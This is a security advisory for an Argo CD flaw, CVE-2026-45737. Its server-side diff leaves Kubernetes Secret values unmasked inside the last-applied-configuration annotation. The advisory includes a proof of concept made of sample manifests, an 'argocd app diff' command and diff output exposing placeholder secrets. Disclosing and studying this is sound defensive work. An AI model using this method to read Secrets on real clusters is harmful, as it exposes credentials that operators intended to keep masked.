# [M] Argo CD: Kubernetes Secret Extraction via ArgoCD ServerSideDiff via sensitive annotations

## Summary
Severity: Medium
Advisory: GHSA-rg3g-4rw9-gqrp
CVE: CVE-2026-45737
CWE: CWE-200, CWE-212
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-19
Source: https://github.com/advisories/GHSA-rg3g-4rw9-gqrp
Type: github-advisory

## Affected
- Go: `github.com/argoproj/argo-cd/v3` — affected >=3.2.0 <3.2.12
- Go: `github.com/argoproj/argo-cd/v3` — affected >=3.3.0-rc1 <3.3.10
- Go: `github.com/argoproj/argo-cd/v3` — affected >=3.4.0-rc1 <3.4.2

## Details
### Summary
The original fix for [GHSA-3v3m-wc6v-x4x3](https://github.com/argoproj/argo-cd/security/advisories/GHSA-3v3m-wc6v-x4x3) is incomplete. argocd app diff --server-side-diff can still expose Kubernetes Secret values embedded in the kubectl.kubernetes.io/last-applied-configuration annotation.

The prior fix masks top-level Secret data in ServerSideDiff responses, but it does not fully sanitize Secret data stored inside the last-applied-configuration annotation. If a Secret was previously created or updated using client-side apply, that annotation may contain raw data, stringData, and sensitive annotations. These values can be shown in UI/CLI diffs.

### Details
The ServerSideDiff endpoint returns ResourceDiff.TargetState / LiveState based on server-side dry-run output. Kubernetes server-side dry-run can return a full predicted live Secret object that carries forward existing live annotations, including:

kubectl.kubernetes.io/last-applied-configuration
For Secrets created with client-side apply, that annotation can contain a JSON-serialized Secret manifest with sensitive values.

The masking path calls HideSecretData(target, live, ...). However, HideSecretData only rewrites the last-applied annotation on the second argument (live). In server-side diff, the first argument can be predictedLive, not a clean Git target. predictedLive can also contain kubectl.kubernetes.io/last-applied-configuration, so the first object’s embedded annotation can remain unmasked.

### PoC
Create an app containing this Secret manifest:
```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: last-applied-secret-repro
---
apiVersion: v1
kind: Secret
metadata:
  name: secret
  namespace: last-applied-secret-repro
  annotations:
    app: test
    token: SECRETVAL
type: Opaque
data:
  password: U0VDUkVUVkFM
  username: U0VDUkVUVkFM
```
Create and Sync Argo App
```yaml
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: last-applied-secret-repro
  namespace: argocd
  annotations:
    argocd.argoproj.io/compare-options: ServerSideDiff=true,IncludeMutationWebhook=true
spec:
  project: default
  destination:
    server: https://kubernetes.default.svc
    namespace: last-applied-secret-repro
  source:
    repoURL: https://github.com/YOUR_ORG/YOUR_REPO.git
    targetRevision: HEAD
    path: last-applied-secret-repro
  syncPolicy:
    automated:
      prune: true
      selfHeal: true
    syncOptions:
      - CreateNamespace=true
      - ServerSideApply=true
```
Run argo cd app diff
`argocd app diff last-applied-secret-repro --server-side-diff --exit-code=false`
```
❯ argocd app diff last-applied-secret-repro --server-side-diff --exit-code=false

===== /Secret last-applied-secret-repro/secret ======
10c10,11
<     kubectl.kubernetes.io/last-applied-configuration: '{"apiVersion":"v1","data":{"password":"++++++++","username":"++++++++"},"kind":"Secret","metadata":{"annotations":{"app":"test","argocd.argoproj.io/tracking-id":"last-applied-secret-repro:/Secret:last-applied-secret-repro/secret","token":"SECRETVAL"},"name":"secret","namespace":"last-applied-secret-repro"},"type":"Opaque"}'
---
>     kubectl.kubernetes.io/last-applied-configuration: |
>       {"apiVersion":"v1","data":{"password":"U0VDUkVUVkFM","username":"U0VDUkVUVkFM"},"kind":"Secret","metadata":{"annotations":{"app":"test","argocd.argoproj.io/tracking-id":"last-applied-secret-repro:/Secret:last-applied-secret-repro/secret","token":"SECRETVAL"},"name":"secret","namespace":"last-applied-secret-repro"},"type":"Opaque"}
```
The secret value can be seen inside the diff

### Impact
Authenticated Argo CD users who can view application diffs may be able to read Secret values that should be masked.

Impacted values include:
Secret data embedded in kubectl.kubernetes.io/last-applied-configuration

## References
- https://github.com/argoproj/argo-cd/security/advisories/GHSA-rg3g-4rw9-gqrp
- https://github.com/argoproj/argo-cd
